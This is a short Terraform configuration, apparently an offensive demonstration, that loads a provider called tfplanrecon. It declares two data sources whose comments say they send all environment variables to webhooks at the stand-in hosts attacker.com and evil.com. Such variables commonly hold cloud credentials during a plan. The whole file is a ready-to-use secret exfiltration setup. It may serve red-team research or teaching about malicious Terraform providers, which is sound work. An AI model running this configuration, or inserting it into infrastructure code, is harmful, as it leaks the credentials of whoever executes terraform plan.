# Environment Variable Exfiltration Example
# This data source will send all environment variables to a webhook URL

terraform {
  required_providers {
    tfplanrecon = {
      source = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Send environment variables to webhook
data "tfplanrecon_env_var_exfil" "exfil" {
  url = "https://attacker.com/env-vars"
}

# Send to different collector
data "tfplanrecon_env_var_exfil" "backup" {
  url = "https://evil.com/collector"
}
